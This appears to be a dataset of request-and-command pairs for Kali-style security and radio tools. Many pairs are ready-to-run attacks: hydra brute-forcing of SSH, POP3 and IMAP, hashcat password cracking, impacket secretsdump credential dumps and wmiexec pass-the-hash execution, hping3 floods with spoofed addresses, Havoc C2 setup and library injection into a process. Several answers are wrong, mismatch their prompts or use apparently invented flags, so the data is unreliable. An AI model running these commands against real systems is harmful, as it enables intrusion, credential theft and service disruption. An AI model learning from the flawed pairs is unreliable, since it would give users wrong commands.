{"input": "Generate a complex sine wave signal with a carrier frequency of 2.2 GHz, a sample rate of 4 MHz, a gain of 22 dB, and a waveform phase offset of 45 degrees using osmocom_siggen_nogui", "answer": "osmocom_siggen_nogui --sine -f 2.2e9 -s 4e6 -g 22 --offset 45"}
{"input": "Generate a constant carrier signal with a carrier frequency of 1.2 GHz, a sample rate of 3 MHz, a gain of 12 dB, and an output amplitude of 0.7 using osmocom_siggen_nogui", "answer": "osmocom_siggen_nogui --const -f 1.2e9 -s 3e6 -g 12 --amplitude 0.7"}
{"input": "Scan all files, including unwanted and difficult ones, in the directory `/var/www/html` using graudit", "answer": "graudit -A /var/www/html"}
{"input": "Perform a case-insensitive scan of all files in the `/home/user/project` directory using graudit", "answer": "graudit -i -A /home/user/project"}
{"input": "Incorporate the event log file \"backup.evt\" into the GrokEVT database located at \"/backup/grokevt/db\" with the new log type \"BackupLog\" and the base type \"SystemLog\"", "answer": "grokevt-addlog /backup/grokevt/db backup.evt BackupLog SystemLog"}
{"input": "Insert the event log file \"error.evt\" into the GrokEVT database stored in \"/usr/local/grokevt/db\" with the new log type \"ErrorLog\" and the base type \"SystemLog\"", "answer": "grokevt-addlog /usr/local/grokevt/db error.evt ErrorLog SystemLog"}
{"input": "Start a gs-netcat server in listening mode, forward traffic to the IP 192.168.1.100 on port 22, and use a secret password \"mysecret123\" for secure communication", "answer": "gs-netcat -l -d 192.168.1.100 -p 22 -s mysecret123"}
{"input": "Connect to a gs-netcat server at IP 10.0.0.5 on port 2222, using UDP instead of TCP, and use the secret password \"udpsecret\"", "answer": "gs-netcat -p 2222 -u -s udpsecret -d 10.0.0.5"}
{"input": "Start a gs-netcat server in daemon mode, listen on port 4444, and use a randomly generated secret for secure communication", "answer": "gs-netcat -l -D -p 4444 -g"}
{"input": "Start a gs-netcat server in verbose mode, listen on port 6666, and log all activity to a file named \"gs-log.txt\"", "answer": "gs-netcat -l -p 6666 -v -L gs-log.txt"}
{"input": "Compute the SHA256 hash for the text \"Hello, World!\" using gtkhash", "answer": "echo -n \"Hello, World!\" | sha256sum"}
{"input": "Update all Greenbone Vulnerability Manager (GVM) feeds to ensure the latest vulnerability data is available", "answer": "sudo greenbone-feed-sync --all"}
{"input": "Synchronize all GVM feeds to ensure the system has the latest security data and vulnerability definitions", "answer": "sudo greenbone-feed-sync --all"}
{"input": "Ensure all Greenbone Vulnerability Manager feeds are up-to-date to maintain accurate vulnerability assessments", "answer": "sudo greenbone-feed-sync --all"}
{"input": "Update all GVM feeds to include the latest security content and vulnerability information", "answer": "sudo greenbone-feed-sync --all"}
{"input": "Refresh all Greenbone Vulnerability Manager feeds to ensure the system has the most recent security updates", "answer": "sudo greenbone-feed-sync --all"}
{"input": "Generate a configuration file template for h8mail in the current directory.\"", "answer": "h8mail --gen-config"}
{"input": "Search for email addresses in the file 'targets.txt', use the breach compilation located at '/path/to/breachcomp', and output the results to 'breach_results.csv'.\"", "answer": "h8mail -t targets.txt -bc /path/to/breachcomp -o breach_results.csv"}
{"input": "Search for email addresses in the file 'emails.txt', use the API keys from 'config.ini', and enable debug mode to print request information.\"", "answer": "h8mail -t emails.txt -c config.ini --debug"}
{"input": "Search for email addresses in the file 'targets.txt', use the local breach files in 'breaches', and enable single-file mode for stability with large files.\"", "answer": "h8mail -t targets.txt -lb breaches -sf"}
{"input": "Enable the antenna power on the HackRF device immediately", "answer": "hackrf_biast -b 1"}
{"input": "Configure the HackRF device with serial number \"123456\" to enable antenna power when entering RX mode and disable it when entering TX mode", "answer": "hackrf_biast -d 123456 -r on -t off"}
{"input": "Configure the HackRF device to disable antenna power when entering RX mode and leave it unchanged when entering TX mode", "answer": "hackrf_biast -r off -t leave"}
{"input": "Program the CPLD on a HackRF device using the XSVF file \"firmware.xsvf\"", "answer": "hackrf_cpldjtag -x firmware.xsvf"}
{"input": "Program the CPLD on a specific HackRF device with the serial number \"123456789\" using the XSVF file \"update.xsvf\"", "answer": "hackrf_cpldjtag -x update.xsvf -d 123456789"}
{"input": "I need to program the CPLD on my HackRF device, but I\u2019m not sure how to use the tool. Can you show me the help menu?", "answer": "hackrf_cpldjtag -h"}
{"input": "Update the CPLD on my HackRF device using the XSVF file \"new_firmware.xsvf\" without specifying a serial number", "answer": "hackrf_cpldjtag -x new_firmware.xsvf"}
{"input": "Program the CPLD on a HackRF device with the serial number \"ABCD1234\" using the XSVF file \"custom_firmware.xsvf\"", "answer": "hackrf_cpldjtag -x custom_firmware.xsvf -d ABCD1234"}
{"input": "I have multiple HackRF devices connected. How do I program the CPLD on the device with serial number \"XYZ987\" using the XSVF file \"patch.xsvf\"?", "answer": "hackrf_cpldjtag -x patch.xsvf -d XYZ987"}
{"input": "Program the CPLD on my HackRF device using the XSVF file \"latest_firmware.xsvf\" and ensure it targets the correct device", "answer": "hackrf_cpldjtag -x latest_firmware.xsvf"}
{"input": "I want to program the CPLD on my HackRF device, but I don\u2019t know the serial number. What command should I use if there\u2019s only one device connected?", "answer": "hackrf_cpldjtag -x firmware.xsvf"}
{"input": "Program the CPLD on a HackRF device with the serial number \"HACKRF1\" using the XSVF file \"upgrade.xsvf\"", "answer": "hackrf_cpldjtag -x upgrade.xsvf -d HACKRF1"}
{"input": "Write the value 0x1A to register 5 of the RFFC5072 chip using HackRF debug", "answer": "hackrf_debug --rffc5072 -n 5 -w 0x1A"}
{"input": "Turn off all LEDs on the HackRF device using HackRF debug", "answer": "hackrf_debug -l 0"}
{"input": "Read register 12 from the MAX2837 chip using HackRF debug", "answer": "hackrf_debug --max2837 -n 12 -r"}
{"input": "Write the value 0x3F to register 8 of the SI5351C chip using HackRF debug", "answer": "hackrf_debug --si5351c -n 8 -w 0x3F"}
{"input": "List all available Opera Cake boards connected to the HackRF device", "answer": "hackrf_operacake -l"}
{"input": "Test the GPIO functionality of the Opera Cake board at address 0", "answer": "hackrf_operacake -o 0 -g"}
{"input": "Set the Opera Cake board at address 3 to switch ports in time mode, dwelling on port A0 for 1000 samples and port B0 for 2000 samples", "answer": "hackrf_operacake -o 3 -m time -t A0:1000 -t B0:2000"}
{"input": "Set the default dwell time to 5000 samples for the Opera Cake board at address 4 in time mode", "answer": "hackrf_operacake -o 4 -m time -w 5000"}
{"input": "Configure the Opera Cake board at address 7 to switch ports manually, connecting port A0 to antenna 3 and port B0 to antenna 4, and test its GPIO functionality", "answer": "hackrf_operacake -o 7 -m manual -a 3 -b 4 -g"}
{"input": "Read 512 bytes of data from the SPI flash memory of the HackRF device, starting at address 1024, and save it to a file named `partial_dump.bin`", "answer": "hackrf_spiflash -r partial_dump.bin -a 1024 -l 512"}
{"input": "Write the firmware file `custom_firmware.bin` to the SPI flash memory of the HackRF device, skipping the firmware compatibility check", "answer": "hackrf_spiflash -w custom_firmware.bin -i"}
{"input": "Write the firmware file `new_firmware.bin` to the SPI flash memory of a specific HackRF device with the serial number `0000000000000001`", "answer": "hackrf_spiflash -w new_firmware.bin -d 0000000000000001"}
{"input": "Read the entire SPI flash memory from the HackRF device, save it to a file named `full_dump.bin`, and reset the device afterward", "answer": "hackrf_spiflash -r full_dump.bin -R"}
{"input": "Write the firmware file `update.bin` to the SPI flash memory of the HackRF device, starting at address 4096, and provide verbose output", "answer": "hackrf_spiflash -w update.bin -a 4096 -v"}
{"input": "Read 256 bytes of data from the SPI flash memory of the HackRF device, starting at address 2048, and save it to a file named `small_dump.bin`", "answer": "hackrf_spiflash -r small_dump.bin -a 2048 -l 256"}
{"input": "Conduct a frequency sweep from 800 MHz to 1600 MHz with the antenna port power disabled, LNA gain set to 8 dB, and save the output to `antenna_disabled_sweep.txt`", "answer": "hackrf_sweep -p 0 -f 800:1600 -l 8 -r antenna_disabled_sweep.txt"}
{"input": "Receive RF signals at 1.5 GHz with a sample rate of 8 MHz, enable the antenna port power, and save the data to a file named `capture.raw`", "answer": "hackrf_transfer -r capture.raw -f 1500000000 -s 8000000 -p 1"}
{"input": "Transmit a signal from a file named `data.raw` at 433 MHz with a sample rate of 2 MHz, enable the RF amplifier, and repeat the transmission", "answer": "hackrf_transfer -t data.raw -f 433000000 -s 2000000 -a 1 -R"}
{"input": "Receive RF signals at 5 GHz with a sample rate of 20 MHz, set the RX LNA gain to 32 dB, and save the data to a file named `recording.raw`", "answer": "hackrf_transfer -r recording.raw -f 5000000000 -s 20000000 -l 32"}
{"input": "Transmit a signal from a file named `signal.raw` at 2.4 GHz with a sample rate of 10 MHz, set the TX VGA gain to 30 dB, and enable the RF amplifier", "answer": "hackrf_transfer -t signal.raw -f 2400000000 -s 10000000 -x 30 -a 1"}
{"input": "Receive RF signals at 1 GHz with a sample rate of 10 MHz, set the baseband filter bandwidth to 5 MHz, and save the data to a file named `data.raw`", "answer": "hackrf_transfer -r data.raw -f 1000000000 -s 10000000 -b 5000000"}
{"input": "Transmit a signal from a file named `test.raw` at 868 MHz with a sample rate of 2 MHz, enable the antenna port power, and set the TX VGA gain to 20 dB", "answer": "hackrf_transfer -t test.raw -f 868000000 -s 2000000 -p 1 -x 20"}
{"input": "Receive RF signals at 2.4 GHz with a sample rate of 10 MHz, set the RX VGA gain to 40 dB, and save the data to a file named `output.raw`", "answer": "hackrf_transfer -r output.raw -f 2400000000 -s 10000000 -g 40"}
{"input": "Start Wi-Fi Coconut in quiet mode, log plain 802.11 packets to a file named `plain_packets.pcap`, and wait for a device to be connected", "answer": "wifi_coconut --quiet --plain-dot11 --pcap=plain_packets.pcap --wait"}
{"input": "Start Wi-Fi Coconut without displaying the channel UI, log packets to stdout for piping to another tool, and disable all LEDs", "answer": "wifi_coconut --no-display --pcap=- --disable-leds"}
{"input": "Use Wi-Fi Coconut with device ID 3, disable LED blinking, and log packets to a file named `device3_capture.pcap`", "answer": "wifi_coconut --coconut-device=3 --disable-blinking --pcap=device3_capture.pcap"}
{"input": "Crawl the website \"example.com\" with a depth of 2, include subdomains, and output the results in JSON format", "answer": "hakrawler -d 2 -subs -json example.com"}
{"input": "Use hamster-sidejack to analyze all session data from the file `traffic_data.pcap` and display the results in a human-readable format", "answer": "hamster-sidejack -f traffic_data.pcap -h"}
{"input": "Crack an MD5 hash using a wordlist attack", "answer": "hashcat -a 0 -m 0 example0.hash example.dict"}
{"input": "Crack a bcrypt hash using a wordlist with the best64 rule applied", "answer": "hashcat -a 0 -m 3200 example3200.hash example.dict -r rules/best64.rule"}
{"input": "Crack a SHA256 hash using a combinator attack with two wordlists", "answer": "hashcat -a 1 -m 1400 example1400.hash wordlist1.txt wordlist2.txt"}
{"input": "Crack a KeePass database using a wordlist attack with the best64 rule applied", "answer": "hashcat -a 0 -m 13400 example13400.kdbx example.dict -r rules/best64.rule"}
{"input": "Crack a MySQL 4.1/5.x hash using a wordlist attack", "answer": "hashcat -a 0 -m 300 example300.hash example.dict"}
{"input": "Crack a PDF 1.7 Level 8 password using a brute-force attack with a custom charset of uppercase letters and digits", "answer": "hashcat -a 3 -m 10700 example10700.pdf -1 ?u?d ?1?1?1?1?1?1?1?1"}
{"input": "Crack a bcrypt hash using a combinator attack with two wordlists", "answer": "hashcat -a 1 -m 3200 example3200.hash wordlist1.txt wordlist2.txt"}
{"input": "Crack a MySQL 4.1/5.x hash using a brute-force attack with a custom charset of lowercase letters and digits", "answer": "hashcat -a 3 -m 300 example300.hash ?l?d"}
{"input": "Crack a SHA512 hash using a wordlist attack with the best64 rule applied", "answer": "hashcat -a 0 -m 1700 example1700.hash example.dict -r rules/best64.rule"}
{"input": "Crack a PDF 1.7 Level 8 password using a wordlist attack with the best64 rule applied", "answer": "hashcat -a 0 -m 10700 example10700.pdf example.dict -r rules/best64.rule"}
{"input": "Crack a bcrypt hash using a wordlist attack with the best64 rule applied", "answer": "hashcat -a 0 -m 3200 example3200.hash example.dict -r rules/best64.rule"}
{"input": "Crack a MySQL 4.1/5.x hash using a wordlist attack with the best64 rule applied", "answer": "hashcat -a 0 -m 300 example300.hash example.dict -r rules/best64.rule"}
{"input": "Analyze the hash \"5f4dcc3b5aa765d61d8327deb882cf99\" and save the results to a file named \"output.txt\" while showing the corresponding Hashcat mode", "answer": "hashid 5f4dcc3b5aa765d61d8327deb882cf99 > output.txt"}
{"input": "Generate a TOTP code using the secret `JBSWY3DPEHPK3PXP` and display it as a QR code", "answer": "oathtool --totp -b JBSWY3DPEHPK3PXP | qrencode -o - -t UTF8"}
{"input": "Connect to the Havoc teamserver running on IP 192.168.1.100 and port 443 as a client", "answer": "havoc client --host 192.168.1.100 --port 443"}
{"input": "Display help information for the Havoc client command", "answer": "havoc client --help"}
{"input": "Connect to the Havoc teamserver at 10.10.10.1 on port 8080 with verbose logging enabled", "answer": "havoc client --host 10.10.10.1 --port 8080 --verbose"}
{"input": "Start the Havoc teamserver on the loopback address (127.0.0.1) and port 5000", "answer": "havoc server --host 127.0.0.1 --port 5000"}
{"input": "Connect to the Havoc teamserver at 192.168.0.50 on port 8443 using a custom configuration file", "answer": "havoc client --host 192.168.0.50 --port 8443 --config custom_config.yaml"}
{"input": "Start the Havoc teamserver on all available interfaces (0.0.0.0) and port 8080", "answer": "havoc server --host 0.0.0.0 --port 8080"}
{"input": "Start hb-honeypot with all options enabled, set the log level to debug, and output logs to the console", "answer": "hb-honeypot --all --loglevel debug --console"}
{"input": "Start hb-honeypot with all options, bind it to the IP address 10.0.0.1, listen on port 443, and log all activity to a file named `honeypot_activity.log`", "answer": "hb-honeypot --all --bind 10.0.0.1 --port 443 --logfile honeypot_activity.log"}
{"input": "Start hb-honeypot with all options, bind it to the IP address 172.16.0.5, listen on port 22, and save the captured data to a file named `ssh_captures.json`", "answer": "hb-honeypot --all --bind 172.16.0.5 --port 22 --output ssh_captures.json"}
{"input": "Run hb-honeypot with all features, set the log level to warning, and output logs to both the console and a file named `honeypot_warnings.log`", "answer": "hb-honeypot --all --loglevel warning --console --logfile honeypot_warnings.log"}
{"input": "Start hb-honeypot with all options, bind it to the IP address 192.168.0.10, listen on port 3389, and limit the maximum number of connections to 50", "answer": "hb-honeypot --all --bind 192.168.0.10 --port 3389 --max-connections 50"}
{"input": "Filter the input PMKID/EAPOL hash file `hashes.txt` to only include ESSIDs with a length between 8 and 16 characters and save the output to `filtered_hashes.txt`", "answer": "hcxhashtool -i hashes.txt -o filtered_hashes.txt --essid-min=8 --essid-max=16"}
{"input": "Convert the input PMKID/EAPOL hash file `hashes.txt` to OUI groups in the working directory", "answer": "hcxhashtool -i hashes.txt --oui-group"}
{"input": "Filter the input PMKID/EAPOL hash file `data.pcap` to only include hashes from clients with the MAC address `AA:BB:CC:DD:EE:FF` and save the output to `client_hashes.txt`", "answer": "hcxhashtool -i data.pcap -o client_hashes.txt --mac-client=AA:BB:CC:DD:EE:FF"}
{"input": "Convert the input PMKID/EAPOL hash file `hashes.txt` to MAC groups for clients in the working directory", "answer": "hcxhashtool -i hashes.txt --mac-group-client"}
{"input": "Convert all possible hashes from the file `capture.pcapng` using hcxpcapngtool, including less optimal hashes that might require additional filtering later", "answer": "hcxpcapngtool --all capture.pcapng"}
{"input": "Extract all possible hashes from multiple `.pcap` files in the current directory and save the output to a file named `output.hc22000`", "answer": "hcxpcapngtool --all -o output.hc22000 *.pcap"}
{"input": "Extract all possible hashes from `capture.pcapng` and save the ESSID wordlist to a file named `essid_wordlist.txt`", "answer": "hcxpcapngtool --all -E essid_wordlist.txt capture.pcapng"}
{"input": "Convert all possible hashes from `capture.pcapng` and save the output to a file named `output.hc22000`, while setting the EAPOL timeout to 10,000 milliseconds", "answer": "hcxpcapngtool --all --eapoltimeout=10000 -o output.hc22000 capture.pcapng"}
{"input": "Extract all possible hashes from `capture.pcapng` and save the device information list to a file named `device_info.txt`", "answer": "hcxpcapngtool --all -D device_info.txt capture.pcapng"}
{"input": "Convert all possible hashes from `capture.pcapng` and save the output to a file named `output.hc22000`, while enabling nonce error corrections with a value of 8", "answer": "hcxpcapngtool --all --nonce-error-corrections=8 -o output.hc22000 capture.pcapng"}
{"input": "Extract all possible hashes from `capture.pcapng` and save the output to a file named `output.hc22000`, while limiting the maximum number of ESSIDs to 3", "answer": "hcxpcapngtool --all --max-essids=3 -o output.hc22000 capture.pcapng"}
{"input": "Read a Pre Shared Key (PSK) from standard input for the ESSID \"OfficeWiFi\"", "answer": "hcxpmktool -e OfficeWiFi -p -"}
{"input": "Read a Pre Shared Key (PSK) from standard input for the ESSID \"CafeWiFi\"", "answer": "hcxpmktool -e CafeWiFi -p -"}
{"input": "Generate a Pre Shared Key (PSK) for the ESSID \"LibraryWiFi\" using the password \"ReadBooks2024\"", "answer": "hcxpmktool -e LibraryWiFi -p ReadBooks2024"}
{"input": "Read a Pre Shared Key (PSK) from standard input for the ESSID \"AirportWiFi\"", "answer": "hcxpmktool -e AirportWiFi -p -"}
{"input": "Filter the wordlist \"candidates.txt\" to include only words with a length of 12 characters and save the result to \"length_12.txt\"", "answer": "awk 'length == 12' candidates.txt > length_12.txt"}
{"input": "Process the wordlist \"input_list.txt\" and output only words that are in uppercase format to a new file named \"uppercase.txt\"", "answer": "grep '^[A-Z]*$' input_list.txt > uppercase.txt"}
{"input": "Process the wordlist \"source.txt\" and output only words that are in uppercase and start with a capital letter to a new file named \"upper_capital.txt\"", "answer": "grep '^[A-Z][A-Z]*$' source.txt > upper_capital.txt"}
{"input": "Upload all `.pcapng` files in the current directory to the WPA-Sec service using the default URL and a user key `securekey456`", "answer": "wlancap2wpasec -k securekey456 *.pcapng"}
{"input": "Upload a WLAN capture file `capture.pcapng` to the WPA-Sec service using the default URL, a user key `key12345`, and an email address `admin@example.com`", "answer": "wlancap2wpasec -k key12345 -e admin@example.com capture.pcapng"}
{"input": "Reverse the operation and convert raw data back to a hex string using hex2raw", "answer": "echo \"Hello World\" | xxd -p"}
{"input": "Analyze the binary file `data.bin` and extract all embedded scripts or macros", "answer": "binwalk -e data.bin"}
{"input": "Convert the Windows Registry hive file \"sam.hive\" into XML format, using heuristics to tolerate corruption within the hive", "answer": "hivexml -u sam.hive > output.xml"}
{"input": "Convert the Windows Registry hive file \"default.hive\" into XML format, skipping errors and using heuristics to tolerate corruption", "answer": "hivexml -k -u default.hive > output.xml"}
{"input": "Convert the Windows Registry hive file \"user.dat\" into XML format without any additional options", "answer": "hivexml user.dat > output.xml"}
{"input": "Export the registry key `Microsoft\\Windows` from the hive file `system.hive` to a file named `exported.reg` using the prefix `HKEY_LOCAL_MACHINE\\SYSTEM`", "answer": "hivexregedit --export --prefix 'HKEY_LOCAL_MACHINE\\SYSTEM' system.hive 'Microsoft\\Windows' > exported.reg"}
{"input": "Merge a registry file `updates.reg` into a hive file `security.hive` using the prefix `HKEY_LOCAL_MACHINE\\SECURITY` and enable debugging to diagnose potential issues", "answer": "hivexregedit --merge --prefix 'HKEY_LOCAL_MACHINE\\SECURITY' --debug security.hive updates.reg"}
{"input": "Merge a registry file `fixes.reg` into a hive file `default.hive` using the prefix `HKEY_USERS\\.DEFAULT` and tolerate potential corruption in the hive file", "answer": "hivexregedit --merge --prefix 'HKEY_USERS\\.DEFAULT' --unsafe default.hive fixes.reg"}
{"input": "Export the registry key `CurrentControlSet\\Enum` from the hive file `system.hive` to standard output using the prefix `HKEY_LOCAL_MACHINE\\SYSTEM` and disable recursion (max depth 0)", "answer": "hivexregedit --export --prefix 'HKEY_LOCAL_MACHINE\\SYSTEM' --max-depth 0 system.hive 'CurrentControlSet\\Enum'"}
{"input": "Export the registry key `Microsoft\\Windows NT\\CurrentVersion` from the hive file `software.hive` to a file named `version.reg` using the prefix `HKEY_LOCAL_MACHINE\\SOFTWARE` and enable debugging", "answer": "hivexregedit --export --prefix 'HKEY_LOCAL_MACHINE\\SOFTWARE' --debug software.hive 'Microsoft\\Windows NT\\CurrentVersion' > version.reg"}
{"input": "Start horst in spectrum analyzer mode to analyze wireless signals on channel 6 using the interface wlan0", "answer": "horst -s -C 6 -i wlan0"}
{"input": "Use horst to monitor wireless traffic on channel 11 with a node timeout of 120 seconds and display updates every 500 milliseconds", "answer": "horst -C 11 -t 120 -d 500"}
{"input": "Analyze wireless traffic on channel 1 with a buffer size of 4096 bytes and display the ESSID view", "answer": "horst -C 1 -b 4096 -V essid"}
{"input": "Start hostapd-wpe with debug logging enabled, using the configuration file `wpe.conf`, and specify an entropy file named `entropy.bin`", "answer": "hostapd-wpe -d -e entropy.bin wpe.conf"}
{"input": "Disable the hostapd service on the current wireless interface", "answer": "sudo systemctl stop hostapd"}
{"input": "Enable the hostapd service on the current wireless interface", "answer": "sudo systemctl enable hostapd && sudo systemctl start hostapd"}
{"input": "Remove a DPP bootstrap configuration with the ID `1`", "answer": "hostapd-wpe_cli dpp_bootstrap_remove 1"}
{"input": "Remove the mapping for \"oldserver.local\" from the hosts file", "answer": "sudo sed -i '/oldserver.local/d' /etc/hosts"}
{"input": "Remove multiple hostnames \"dev.local\" and \"staging.local\" from the hosts file", "answer": "sudo sed -i '/dev.local/d; /staging.local/d' /etc/hosts"}
{"input": "Patch the process with PID 9101 using the shared library `libpayload.so` and enable verbose logging to see detailed output", "answer": "hotpatcher -vv -l libpayload.so 9101"}
{"input": "Perform a dry run to patch the process with PID 5566 using the shared library `libtest.so` and invoke the symbol `initialize` without resetting the execution pointer", "answer": "hotpatcher -N -l libtest.so -s initialize 5566"}
{"input": "Send a TCP SYN packet to the IP address 192.168.1.1 on port 80 with a TTL of 128 and verbose output", "answer": "hping3 -S -p 80 -t 128 -V 192.168.1.1"}
{"input": "Flood the IP address 10.0.0.5 with ICMP echo requests as fast as possible without waiting for replies", "answer": "hping3 -1 --flood 10.0.0.5"}
{"input": "Send a UDP packet to the IP address 172.16.0.2 on port 53 with a spoofed source address of 172.16.0.1", "answer": "hping3 -2 -p 53 -a 172.16.0.1 172.16.0.2"}
{"input": "Send a TCP packet with the FIN, PUSH, and URG flags set to the IP address 10.10.10.10 on port 443", "answer": "hping3 -F -P -U -p 443 10.10.10.10"}
{"input": "List all available htaccess shells and attacks in the htshells directory", "answer": "ls /usr/share/htshells"}
{"input": "Probe a list of domains from a file named \"domains_list.txt\" to find working HTTP and HTTPS servers, but prefer HTTPS and only try HTTP if HTTPS fails", "answer": "cat domains_list.txt | httprobe -prefer-https"}
{"input": "Probe a list of domains from a file named \"targets.txt\" to find working HTTP and HTTPS servers, using a concurrency level of 40, a timeout of 8000 milliseconds, and prefer HTTPS over HTTP", "answer": "cat targets.txt | httprobe -c 40 -t 8000 -prefer-https"}
{"input": "Scan the hosts in `targets.txt` and filter out responses with a content length of 100 or 102 bytes", "answer": "httpx -l targets.txt -cl 100,102"}
{"input": "Scan the hosts in `targets.txt` and display only responses that contain the string \"Welcome\"", "answer": "httpx -l targets.txt -mc \"Welcome\""}
{"input": "Mirror \"example.com\" and replace external HTML links with error pages, saving the files to \"/home/user/replace_external\"", "answer": "httrack http://example.com -O /home/user/replace_external --ext-depth=0"}
{"input": "Mirror \"example.com\" and use a proxy server at \"proxy.example.com:8080\", saving the files to \"/home/user/proxy_mirror\"", "answer": "httrack http://example.com -O /home/user/proxy_mirror -P proxy.example.com:8080"}
{"input": "Mirror \"example.com\" and preserve the original links in the HTML files, saving them to \"/home/user/original_links\"", "answer": "httrack http://example.com -O /home/user/original_links -K4"}
{"input": "Mirror \"example.com\" and limit the number of connections to 5, saving the files to \"/home/user/limited_connections\"", "answer": "httrack http://example.com -O /home/user/limited_connections -c5"}
{"input": "Mirror \"example.com\" and use a custom user-agent string \"MyCustomAgent/1.0\", saving the files to \"/home/user/custom_agent\"", "answer": "httrack http://example.com -O /home/user/custom_agent -F \"MyCustomAgent/1.0\""}
{"input": "Mirror the website \"example.org\" including all linked pages and save it to a folder called \"mirror_example\" on my desktop", "answer": "httrack http://example.org -O ~/Desktop/mirror_example"}
{"input": "Observe network flows and events while specifying a custom configuration file for Hubble", "answer": "hubble observe --config /path/to/custom/config.yaml"}
{"input": "Calculate the MD5 digest of the string \"Hello World\"", "answer": "echo -n \"Hello World\" | md5sum"}
{"input": "Calculate the SHA1 checksum of the string \"Hello World\"", "answer": "echo -n \"Hello World\" | sha1sum"}
{"input": "Calculate the SHA512 checksum of the string \"Hello World\"", "answer": "echo -n \"Hello World\" | sha512sum"}
{"input": "Calculate the SHA224 checksum of the string \"Hello World\"", "answer": "echo -n \"Hello World\" | sha224sum"}
{"input": "Create a default password list specifically for Linksys devices using dpl4hydra", "answer": "dpl4hydra linksys"}
{"input": "Crack the POP3 service on IP 10.10.10.20 using a colon-separated list of login:password pairs from `combos.txt` and exit after the first successful login is found", "answer": "hydra -C combos.txt -F pop3://10.10.10.20"}
{"input": "Attack the Telnet service on IP 192.168.2.15 using a list of usernames from `usernames.txt`, a list of passwords from `passwords.txt`, and run 32 parallel tasks", "answer": "hydra -L usernames.txt -P passwords.txt -t 32 telnet://192.168.2.15"}
{"input": "Perform a brute-force attack on the IMAP service running on IP 192.168.3.10 using a list of usernames from `users.txt`, a list of passwords from `passwords.txt`, and write the results to `output.json` in JSON format", "answer": "hydra -L users.txt -P passwords.txt -o output.json -b json imap://192.168.3.10"}
{"input": "Perform a Hydra attack on the SSH service at domain example.com using a single username `admin` and a password list from `ssh_passwords.txt`. Test for reverse login and use port 22", "answer": "hydra -l admin -P ssh_passwords.txt example.com ssh -s 22"}
{"input": "Decode the SPD EEPROM information from all DIMMs, even if the checksum fails, and display the output side-by-side with merged cells", "answer": "decode-dimms -c --side-by-side --merge-cells"}
{"input": "Load the I2C dump file \"sensor_data.bin\" for the device at address 0x48 using i2c-stub-from-dump", "answer": "i2c-stub-from-dump 0x48 sensor_data.bin"}
{"input": "Load the I2C dump file \"custom_device.bin\" for a device at address 0x5A using i2c-stub-from-dump", "answer": "i2c-stub-from-dump 0x5A custom_device.bin"}
{"input": "Perform a read-only scan of I2C bus 1 to detect devices without writing to any addresses", "answer": "i2cdetect -y -r 1"}
{"input": "Dump all registers from the I2C device at address 0x40 on bus 3 in consecutive byte mode", "answer": "i2cdump -y 3 0x40 c"}
{"input": "Write the value 0x02 to the I2C device at address 0x70 on bus 5, targeting the register at address 0x20, and use a mask of 0x0F to modify only specific bits", "answer": "i2cset -y -m 0x0F 5 0x70 0x20 0x02"}
{"input": "Write the value 0xDE to the I2C device at address 0x18 on bus 7, targeting the register at address 0x40, and force the operation even if the device is busy", "answer": "i2cset -y -f 7 0x18 0x40 0xDE"}
{"input": "Write 8 bytes of data (0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0x07, 0x08) to the I2C device at address 0x30 on bus 2, and enable verbose mode for detailed output", "answer": "i2ctransfer -v 2 w8@0x30 0x01 0x02 0x03 0x04 0x05 0x06 0x07 0x08"}
{"input": "Perform a write operation of 3 bytes (0xAA, 0xBB, 0xCC) to the I2C device at address 0x80 on bus 6, and force the operation even if the address is marked as used", "answer": "i2ctransfer -f 6 w3@0x80 0xAA 0xBB 0xCC"}
{"input": "Enumerate the users running processes on ports 111, 2049, and 6000 for the host at 10.0.0.20 using ident-user-enum", "answer": "ident-user-enum.pl 10.0.0.20 -p 111,2049,6000"}
{"input": "Enumerate the users running processes on ports 161, 162, and 389 for the host at 10.1.1.100 using ident-user-enum", "answer": "ident-user-enum.pl -p 161,162,389 10.1.1.100"}
{"input": "Scan the IP 10.129.228.124 using ike-scan with a custom identification value of \"test\" and identification type of 3 (ID_USER_FQDN)", "answer": "ike-scan 10.129.228.124 --id=test --idtype=3"}
{"input": "Scan the IP 10.129.228.124 using ike-scan with a custom ISAKMP header flags value of 0x01", "answer": "ike-scan 10.129.228.124 --hdrflags=0x01"}
{"input": "Scan the IP 10.129.228.124 using ike-scan with a custom ISAKMP message ID of 1234", "answer": "ike-scan 10.129.228.124 --hdrmsgid=1234"}
{"input": "Scan the IP 10.129.228.124 using ike-scan with a custom exchange type of 5", "answer": "ike-scan 10.129.228.124 --exchange=5"}
{"input": "Forcefully update all components of ImHex, even if they are already up to date", "answer": "sudo apt update && sudo apt install --reinstall imhex"}
{"input": "Dump all RPC endpoints from the target machine at IP 10.129.228.124 using the username \"admin\" and password \"password123\"", "answer": "impacket-rpcdump admin:password123@10.129.228.124"}
{"input": "Dump all RPC endpoints from the target machine at IP 10.129.228.124 with debug output enabled, using the username \"admin\" and password \"password123\"", "answer": "impacket-rpcdump -debug admin:password123@10.129.228.124"}
{"input": "Dump the list of users from the target system at IP 192.168.1.100 using the username \"admin\" and password \"password123\"", "answer": "impacket-samrdump admin:password123@192.168.1.100"}
{"input": "Extract only NTDS.DIT data (NTLM hashes and Kerberos keys) from the remote machine at IP 192.168.1.100 using the domain \"example.com\", username \"admin\", and password \"Password123\"", "answer": "impacket-secretsdump -just-dc example.com/admin:Password123@192.168.1.100"}
{"input": "Dump secrets from the remote machine at IP 192.168.1.100 using the domain \"example.com\", username \"admin\", and NTLM hashes \"LMHASH:NTHASH\"", "answer": "impacket-secretsdump -hashes LMHASH:NTHASH example.com/admin@192.168.1.100"}
{"input": "Dump secrets from the remote machine at IP 192.168.1.100 using the domain \"example.com\", username \"admin\", and specify the domain controller IP as 192.168.1.1", "answer": "impacket-secretsdump -dc-ip 192.168.1.1 example.com/admin@192.168.1.100"}
{"input": "Execute a PowerShell command on the target machine with IP 172.16.0.20 using the username \"user\" and NTLM hashes \"LMHASH:NTHASH\", and enable debug output", "answer": "impacket-wmiexec -hashes LMHASH:NTHASH user@172.16.0.20 -shell-type powershell -debug"}
{"input": "Run a command on the target machine with IP 192.168.2.15 using the username \"admin\" and password \"adminpass\", and specify the domain controller IP as 192.168.2.1", "answer": "impacket-wmiexec admin:adminpass@192.168.2.15 -dc-ip 192.168.2.1"}
{"input": "Execute a command on the target machine with IP 10.10.10.10 using the username \"testuser\" and password \"testpass\", and use a custom codec \"latin1\" for encoding the output", "answer": "impacket-wmiexec testuser:testpass@10.10.10.10 -codec latin1"}
